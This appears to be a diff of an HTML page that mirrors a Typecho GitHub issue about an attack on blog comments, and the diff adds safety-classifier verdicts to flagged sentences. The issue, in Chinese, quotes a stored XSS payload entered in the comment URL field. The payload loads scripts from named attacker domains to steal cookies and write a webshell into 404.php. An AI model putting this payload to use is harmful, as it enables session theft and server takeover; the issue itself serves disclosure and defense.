@@ -60,7 +60,7 @@
         <h1 class="page-hero__title">Issues</h1>
         <p class="hs-post__source">github.com &middot;
           <a href="https://github.com/typecho/typecho/issues/1545" target="_blank" rel="noopener nofollow">https://github.com/typecho/typecho/issues/1545</a></p>
-        <p class="hs-post__stats"><span class="hs-chip">2 of 12 sentences flagged</span></p>
+        <p class="hs-post__stats"><span class="hs-chip">2 of 12 sentences flagged</span> <a class="hs-chip hs-chip--unsafe" href="#guardrails">2 not safe per guardrails</a></p>
       </div>
     </section>
 
@@ -73,13 +73,21 @@
           <a class="btn btn--ghost" href="07061.html">Next &rarr;</a>
         </nav>
         <article class="hs-post__body">
-<p>We read every piece of feedback, and take your input very seriously. To see all available qualifiers, see our documentation. Have a question about this project? Sign up for a free GitHub account to open an issue and contact its maintainers and the community. By clicking “Sign up for GitHub”, you agree to our terms of service and privacy statement. We’ll occasionally send you account related emails. Already on GitHub? <mark data-sent="7">Sign in to your account</mark></p>
-<p><mark data-sent="7">在评论网址栏输入： 注意：具体网址已经用xxx代替 jQuery.js cookie.js</mark></p>
+<p>We read every piece of feedback, and take your input very seriously. To see all available qualifiers, see our documentation. Have a question about this project? Sign up for a free GitHub account to open an issue and contact its maintainers and the community. By clicking “Sign up for GitHub”, you agree to our terms of service and privacy statement. We’ll occasionally send you account related emails. Already on GitHub? <mark class="unsafe" id="s7" data-sent="7" title="Llama Guard: unsafe (Code Interpreter Abuse); MD-Judge: safe; Qwen3Guard: safe">Sign in to your account</mark></p>
+<p><mark class="unsafe" data-sent="7" title="Llama Guard: unsafe (Code Interpreter Abuse); MD-Judge: safe; Qwen3Guard: safe">在评论网址栏输入： 注意：具体网址已经用xxx代替 jQuery.js cookie.js</mark></p>
 <p>The text was updated successfully, but these errors were encountered:</p>
 <p>我也遇到了同样的攻击，另外提醒一下，我们可没有义务对这个域名模糊处理。 想去测试自己肉鸡规模的尽管去试好了。 xxs.jnhrich.com jackmi.jnhrich.com 这个问题可以通过增加合理的字符串长度限制暂时缓解。</p>
-<p>Sorry, something went wrong. <mark data-sent="9">草就是这个傻叉。 http://xxx.xxx.com/&quot;&gt;&lt;script/src=&quot;https://xss.jnhrich.com/myjs/cookie.js&quot;&gt;&lt;/script&gt;&lt;script/src=https://jackmi.jnhrich.com/jquery.js&gt;&lt;/script&gt;&lt;a/href=&quot;# 1、获取cookie 2、404.php被写入一句话shell</mark></p>
+<p>Sorry, something went wrong. <mark class="unsafe" id="s9" data-sent="9" title="Llama Guard: unsafe (Code Interpreter Abuse); MD-Judge: unsafe; Qwen3Guard: controversial (Non-violent Illegal Acts)">草就是这个傻叉。 http://xxx.xxx.com/&quot;&gt;&lt;script/src=&quot;https://xss.jnhrich.com/myjs/cookie.js&quot;&gt;&lt;/script&gt;&lt;script/src=https://jackmi.jnhrich.com/jquery.js&gt;&lt;/script&gt;&lt;a/href=&quot;# 1、获取cookie 2、404.php被写入一句话shell</mark></p>
 <p>Sorry, something went wrong. No branches or pull requests</p>
         </article>
+<section id="guardrails" class="hs-guardrails">
+<h2>Guardrail verdicts</h2>
+<p>2 flagged sentences rated not safe by at least one guard (Llama Guard, MD-Judge, Qwen3Guard).</p>
+<ol>
+<li><a href="#s7">&ldquo;Sign in to your account 在评论网址栏输入： 注意：具体网址已经用xxx代替 jQuery.js cookie.js&rdquo;</a><div class="hs-verdicts"><span class="hs-verdict unsafe">Llama Guard: unsafe (Code Interpreter Abuse)</span> <span class="hs-verdict safe">MD-Judge: safe</span> <span class="hs-verdict safe">Qwen3Guard: safe</span></div></li>
+<li><a href="#s9">&ldquo;草就是这个傻叉。 http://xxx.xxx.com/&quot;&gt;&lt;script/src=&quot;https://xss.jnhrich.com/myjs/cookie.js&quot;&gt;&lt;/script&gt;&lt;script/src=https://jackmi.jnhrich.com/jquery.js&gt;&lt;/script&gt;&lt;a/href=&quot;# 1、获取cookie 2、404.php被写入一句话shell&rdquo;</a><div class="hs-verdicts"><span class="hs-verdict unsafe">Llama Guard: unsafe (Code Interpreter Abuse)</span> <span class="hs-verdict unsafe">MD-Judge: unsafe</span> <span class="hs-verdict controversial">Qwen3Guard: controversial (Non-violent Illegal Acts)</span></div></li>
+</ol>
+</section>
       </div>
     </section>
   </main>
